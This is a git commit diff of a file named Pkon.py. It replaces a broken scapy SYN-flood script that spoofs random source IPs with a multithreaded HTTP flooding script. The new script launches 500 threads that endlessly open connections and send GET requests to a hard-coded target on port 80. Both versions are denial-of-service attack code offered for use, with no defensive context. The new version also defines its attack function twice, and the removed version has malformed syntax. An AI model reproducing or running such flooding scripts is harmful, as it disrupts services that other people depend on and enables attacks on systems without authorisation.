97410bdd36fad18368b0ceda26ba657784d34233
VinzPropler <109711698+VinzPropler@users.noreply.github.com>
2022-07-26 18:29:23 +0700

    Update Pkon.py

--- Pkon.py
+++ Pkon.py
@@ -1,19 +1,33 @@
-from scapy.all import *
-target_IP = input("Enter IP address of Target: ")
-source_port = int(input("Enter Source Port Number:"))
-i = 1
+import socket
+import threading
 
-while True:
-   a = str(random.randint(1,254))
-   b = str(random.randint(1,254))
-   c = str(random.randint(1,254))
-   d = str(random.randint(1,254))
-   dot = “.”
-   
-  Source_ip = a + dot + b + dot + c + dot + d
-   IP1 = IP(source_IP = source_IP, destination = target_IP)
-   TCP1 = TCP(srcport = source_port, dstport = 80)
-   pkt = IP1 / TCP1
-   send(pkt,inter = .001)
-   print ("packet sent ", i)
-      i = i + 1
+target = '10.0.0.138'
+fake_ip = '182.21.20.32'
+port = 80
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        s.close()
+
+for i in range(500):
+    thread = threading.Thread(target=attack)
+    thread.start()
+
+attack_num = 0
+
+def attack():
+    while True:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        s.connect((target, port))
+        s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
+        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
+        
+        global attack_num
+        attack_num += 1
+        print(attack_num)
+        
+        s.close()
